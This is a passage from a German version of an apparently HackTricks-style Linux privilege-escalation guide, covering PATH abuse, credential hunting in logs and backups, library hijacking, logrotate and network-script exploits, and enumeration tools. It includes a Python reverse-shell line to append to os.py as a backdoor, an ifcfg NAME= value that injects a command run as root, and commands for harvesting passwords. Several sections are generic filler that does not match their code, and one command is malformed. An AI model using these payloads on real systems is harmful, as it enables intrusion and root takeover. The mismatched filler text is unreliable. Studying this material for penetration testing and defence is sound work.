Um nach solchen Schwachstellen zu suchen, können Sie die folgenden Schritte ausführen:

1. Überprüfen Sie den Inhalt des PATH des Benutzers, indem Sie den Befehl `echo $PATH` ausführen.
2. Überprüfen Sie die Berechtigungen der Verzeichnisse im PATH, um sicherzustellen, dass sie nicht schreibbar sind.
3. Überprüfen Sie den Inhalt der Verzeichnisse im PATH, um verdächtige Skripte oder Binärdateien zu identifizieren.
4. Überprüfen Sie die Berechtigungen der gefundenen Dateien, um sicherzustellen, dass sie nicht schreibbar sind.
5. Überprüfen Sie den Inhalt der gefundenen Dateien auf verdächtigen Code oder Anweisungen.

Wenn Sie verdächtige Dateien oder Code finden, sollten Sie diese entfernen oder umbenennen, um potenzielle Angriffe zu verhindern. Stellen Sie außerdem sicher, dass die Berechtigungen der Verzeichnisse und Dateien im PATH korrekt konfiguriert sind, um unautorisierte Änderungen zu verhindern.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Webdateien**

Webdateien sind Dateien, die auf einem Webserver gespeichert sind und über das Internet zugänglich sind. Sie können verschiedene Arten von Inhalten enthalten, wie HTML, CSS, JavaScript, Bilder, Videos und andere Ressourcen. Webdateien werden verwendet, um Webseiten und Webanwendungen zu erstellen und bereitzustellen.

#### **Webserver-Konfigurationsdateien**

Webserver-Konfigurationsdateien enthalten Einstellungen und Regeln für den Betrieb des Webservers. Sie können Informationen wie den Port, auf dem der Webserver lauscht, den Standardordner für Webdateien, Zugriffsbeschränkungen und andere Sicherheitsmaßnahmen enthalten. Durch das Ändern der Konfigurationsdateien können Sie das Verhalten des Webservers anpassen und möglicherweise Sicherheitslücken ausnutzen.

#### **Webanwendungsschwachstellen**

Webanwendungsschwachstellen sind Sicherheitslücken in Webanwendungen, die von Angreifern ausgenutzt werden können, um unbefugten Zugriff auf das System zu erlangen oder schädlichen Code einzufügen. Beispiele für Webanwendungsschwachstellen sind Cross-Site Scripting (XSS), SQL-Injektion, Remote File Inclusion (RFI) und Cross-Site Request Forgery (CSRF). Durch das Ausnutzen dieser Schwachstellen können Angreifer Privilegien eskalieren und auf vertrauliche Informationen zugreifen.

#### **Webserver-Logdateien**

Webserver-Logdateien enthalten Informationen über die Aktivitäten auf dem Webserver, wie Anfragen von Benutzern, Zugriffsversuche und Fehlermeldungen. Durch die Analyse von Logdateien können Sie potenzielle Schwachstellen und Angriffe identifizieren. Sie können auch Informationen über die IP-Adresse des Angreifers, den verwendeten User-Agent und andere Details enthalten, die bei der Untersuchung von Sicherheitsvorfällen hilfreich sein können.

#### **Webanwendung-Frameworks und CMS**

Webanwendung-Frameworks und Content-Management-Systeme (CMS) sind Softwaretools, die verwendet werden, um die Entwicklung und Verwaltung von Webanwendungen zu erleichtern. Beispiele für Webanwendung-Frameworks sind Django, Ruby on Rails und Laravel, während Beispiele für CMS WordPress, Joomla und Drupal sind. Diese Frameworks und CMS können Sicherheitslücken aufweisen, die von Angreifern ausgenutzt werden können, um Zugriff auf das System zu erlangen oder schädlichen Code einzufügen. Es ist wichtig, diese Tools auf dem neuesten Stand zu halten und bekannte Sicherheitslücken zu patchen, um Angriffe zu verhindern.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**

Backups sind eine wichtige Sicherheitsmaßnahme, um Datenverlust zu verhindern. Sie sollten regelmäßig erstellt und an einem sicheren Ort aufbewahrt werden. Hier sind einige bewährte Methoden für die Erstellung und Verwaltung von Backups:

- **Regelmäßige Backups**: Führen Sie regelmäßig Backups durch, um sicherzustellen, dass Ihre Daten immer auf dem neuesten Stand sind. Dies kann täglich, wöchentlich oder monatlich erfolgen, je nachdem, wie oft sich Ihre Daten ändern.

- **Offsite-Backups**: Bewahren Sie mindestens eine Kopie Ihrer Backups an einem anderen physischen Standort auf. Dadurch wird sichergestellt, dass Ihre Daten auch im Falle eines physischen Schadens an Ihrem Hauptstandort geschützt sind.

- **Verschlüsselung**: Verschlüsseln Sie Ihre Backups, um sicherzustellen, dass Ihre Daten auch bei unbefugtem Zugriff geschützt sind. Verwenden Sie starke Verschlüsselungsalgorithmen und sichere Passwörter.

- **Überprüfung der Integrität**: Überprüfen Sie regelmäßig die Integrität Ihrer Backups, um sicherzustellen, dass sie nicht beschädigt oder manipuliert wurden. Dies kann durch Vergleich der Hash-Werte oder Verwendung von Integritätsprüfungssoftware erfolgen.

- **Testwiederherstellung**: Führen Sie regelmäßig Testwiederherstellungen durch, um sicherzustellen, dass Ihre Backups ordnungsgemäß funktionieren und Ihre Daten erfolgreich wiederhergestellt werden können.

- **Versionierung**: Verwenden Sie eine Versionierungsfunktion, um ältere Versionen Ihrer Daten zu speichern. Dadurch können Sie auf frühere Versionen zurückgreifen, falls Sie versehentlich Daten überschreiben oder löschen.

- **Automatisierung**: Automatisieren Sie den Backup-Prozess, um sicherzustellen, dass regelmäßige Backups durchgeführt werden, ohne dass menschliches Eingreifen erforderlich ist.

Indem Sie diese bewährten Methoden für Backups implementieren, können Sie sicherstellen, dass Ihre Daten sicher und vor Datenverlust geschützt sind.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien mit Passwörtern

Lesen Sie den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er sucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das Sie verwenden können, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), eine Open-Source-Anwendung, mit der viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux und Mac abgerufen werden können.

### Protokolle

Wenn Sie Protokolle lesen können, können Sie möglicherweise **interessante/vertrauliche Informationen darin finden**. Je seltsamer das Protokoll ist, desto interessanter ist es wahrscheinlich.\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **Überwachungsprotokolle** es Ihnen ermöglichen, Passwörter in Überwachungsprotokollen aufzuzeichnen, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Protokolle zu lesen**, wird die Gruppe [**adm**](interesting-groups-linux-pe/#adm-group) sehr hilfreich sein.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generische Creds-Suche/Regex

Sie sollten auch nach Dateien suchen, die das Wort "**Passwort**" im **Namen** oder im **Inhalt** enthalten, und auch nach IPs und E-Mails in Protokollen oder Hashes mit Regex suchen.\
Ich werde hier nicht erklären, wie man das alles macht, aber wenn Sie interessiert sind, können Sie die letzten Überprüfungen überprüfen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt.

## Beschreibbare Dateien

### Python-Bibliotheken-Hijacking

Wenn Sie wissen, **woher** ein Python-Skript ausgeführt wird und Sie in diesem Ordner schreiben können oder Sie **Python-Bibliotheken ändern können**, können Sie die OS-Bibliothek ändern und sie backdooren (wenn Sie schreiben können, wo das Python-Skript ausgeführt wird, kopieren und fügen Sie die os.py-Bibliothek ein).

Um die Bibliothek zu **backdooren**, fügen Sie einfach am Ende der os.py-Bibliothek die folgende Zeile hinzu (ändern Sie IP und PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Ausnutzung von Logrotate

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibberechtigungen** auf einer Protokolldatei oder deren übergeordneten Verzeichnissen potenziell erhöhte Berechtigungen zu erlangen. Dies liegt daran, dass `logrotate`, das oft als **root** ausgeführt wird, manipuliert werden kann, um beliebige Dateien auszuführen, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, nicht nur die Berechtigungen in _/var/log_, sondern auch in jedem Verzeichnis zu überprüfen, in dem die Protokollrotation angewendet wird.

{% hint style="info" %}
Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter.
{% endhint %}

Weitere detaillierte Informationen zur Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Sie können diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx-Protokolle)**, daher sollten Sie immer überprüfen, wer die Protokolle verwaltet und ob Sie Berechtigungen eskalieren können, indem Sie die Protokolle durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Verwundbarkeitsreferenz:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus irgendeinem Grund in der Lage ist, ein `ifcf-<was auch immer>`-Skript in _/etc/sysconfig/network-scripts_ **zu schreiben** oder ein vorhandenes anzupassen, dann ist Ihr **System kompromittiert**.

Netzwerkskripte, z.B. _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Sie werden jedoch auf Linux von Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das `NAME=`-Attribut in diesen Netzwerkskripten nicht korrekt behandelt. Wenn Sie **Leerzeichen im Namen haben, versucht das System, den Teil nach dem Leerzeichen auszuführen**. Dies bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Beachten Sie den Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` enthält **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Verwaltungssystem**. Es enthält Skripte zum `Starten`, `Stoppen`, `Neustarten` und manchmal zum `Neuladen` von Diensten. Diese können direkt oder über symbolische Links in `/etc/rc?.d/` ausgeführt werden. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verbunden, einem neueren **Service-Management-System**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Management-Aufgaben verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte aufgrund einer Kompatibilitätsschicht in Upstart weiterhin zusammen mit Upstart-Konfigurationen verwendet.

**systemd** ist ein moderner Initialisierungs- und Service-Manager, der erweiterte Funktionen wie das Starten von Daemons auf Abruf, das Verwalten von Automounts und das Erstellen von Systemzustandssnapshots bietet. Es organisiert Dateien in `/usr/lib/systemd/` für Vertriebspakete und `/etc/systemd/system/` für Administratoränderungen und vereinfacht so den Systemverwaltungsprozess.

## Weitere Tricks

### NFS-Privileg-Eskalation

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Entkommen aus eingeschränkten Shells

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Kernel-Sicherheitsschutz

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Weitere Hilfe

[Statische impacket-Binärdateien](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privesc-Tools

### **Bestes Tool zur Suche nach Linux-Privileg-Eskalationsvektoren:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physischer Zugriff):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Sammlung weiterer Skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen** möchten, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/h
